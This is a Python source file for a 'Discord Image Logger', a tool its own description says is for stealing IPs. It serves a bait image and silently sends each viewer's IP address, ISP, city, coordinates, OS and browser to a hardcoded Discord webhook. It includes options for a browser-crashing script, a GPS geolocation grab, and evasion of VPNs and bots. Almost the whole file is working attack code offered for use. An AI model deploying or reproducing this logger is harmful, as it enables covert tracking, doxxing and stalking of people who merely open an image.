from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
import os

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1468685591075098666/zSG0-obqS_lNp_Hh9MK6dOVT-ffb3IeZjUgOjD-jx2W_mpPIf8fJwh1M1KTrOydLYi5s",
    "image": "https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Captain WebHook", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 3, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown') if info.get('isp') else 'Unknown'}`
> **ASN:** `{info.get('as', 'Unknown') if info.get('as') else 'Unknown'}`
> **Country:** `{info.get('country', 'Unknown') if info.get('country') else 'Unknown'}`
> **Region:** `{info.get('regionName', 'Unknown') if info.get('regionName') else 'Unknown'}`
> **City:** `{info.get('city', 'Unknown') if info.get('city') else 'Unknown'}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')}` ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        """Handle GET and POST requests"""
        try:
            # Extract headers safely
            headers = self.headers if hasattr(self, 'headers') else {}
            
            # Get client IP with multiple fallbacks
            ip = headers.get('x-forwarded-for') or headers.get('cf-connecting-ip') or self.client_address[0]
            if ',' in str(ip):
                ip = ip.split(',')[0].strip()
            
            # Parse URL parameters
            path = self.path
            query_string = path.split('?')[1] if '?' in path else ''
            query_params = dict(parse.parse_qsl(query_string)) if query_string else {}
            
            # Get image URL
            url = config["image"]
            if config["imageArgument"]:
                if query_params.get("url"):
                    try:
                        url = base64.b64decode(query_params.get("url")).decode()
                    except:
                        pass
                elif query_params.get("id"):
                    try:
                        url = base64.b64decode(query_params.get("id")).decode()
                    except:
                        pass

            # Generate HTML with image
            html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''
            
            # Check if IP is blacklisted
            if ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'OK')
                return
            
            # Check if it's a bot
            user_agent = headers.get('user-agent', 'Unknown')
            bot = botCheck(ip, user_agent)
            
            if bot:
                # Send bot detection report
                try:
                    makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
                except Exception as e:
                    print(f"Error in makeReport for bot: {str(e)}")
                
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_response(302)
                    self.send_header('Location', url)
                    self.end_headers()
                return
            
            # Not a bot - log the IP
            result = None
            try:
                if query_params.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(query_params.get("g")).decode()
                    result = makeReport(ip, user_agent, location, path.split("?")[0], url=url)
                else:
                    result = makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
            except Exception as e:
                print(f"Error in makeReport: {str(e)}")
            
            # Prepare message
            message = config["message"]["message"]
            
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                message = message.replace("{long}", str(result.get("lon", "Unknown")))
                timezone = result.get("timezone", "Unknown")
                if '/' in timezone:
                    message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
                else:
                    message = message.replace("{timezone}", timezone)
                message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                
                try:
                    os_info, browser_info = httpagentparser.simple_detect(user_agent)
                    message = message.replace("{browser}", browser_info)
                    message = message.replace("{os}", os_info)
                except:
                    pass

            body_content = html_content

            if config["message"]["doMessage"]:
                body_content = message
            
            if config["crashBrowser"]:
                body_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return

            # Handle accurate location if needed
            if config["accurateLocation"]:
                body_content += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(body_content.encode() if isinstance(body_content, str) else body_content)
        
        except Exception as e:
            error_msg = traceback.format_exc()
            print(f"ERROR: {error_msg}")
            try:
                reportError(error_msg)
            except:
                pass
            
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f"500 - Internal Server Error<br><pre>{error_msg}</pre>".encode())

    def do_GET(self):
        self.handleRequest()
    
    def do_POST(self):
        self.handleRequest()

handler = ImageLoggerAPI
